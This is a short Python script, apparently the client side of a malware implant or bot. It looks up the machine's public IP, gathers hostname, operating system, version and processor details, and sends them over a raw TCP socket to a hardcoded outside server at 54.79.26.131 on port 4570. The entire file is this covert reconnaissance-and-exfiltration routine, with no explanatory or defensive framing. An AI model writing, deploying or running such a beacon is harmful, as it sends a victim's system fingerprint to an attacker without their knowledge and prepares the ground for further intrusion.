import platform
import socket
from requests import get


#Server info
ip = '54.79.26.131'
port = 4570
DeviceIP = get('https://api.ipify.org').content.decode('utf8')

#Computer info
system_info = platform.uname()
System = f"System: {system_info.system}"
NodeName = f"Node Name: {system_info.node}"
Release = f"Release: {system_info.release}"
Version = f"Version: {system_info.version}"
Machine = f"Machine: {system_info.machine}"
Processor = f"Processor: {system_info.processor}"
CowIP = f"IP: {DeviceIP}"


cow = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cow.connect((ip, port))
PCinfo = ":PCINFO\n" + "\n".join([System, NodeName, Release, Version, Machine, Processor, CowIP])
cow.send(PCinfo.encode())
cow.close()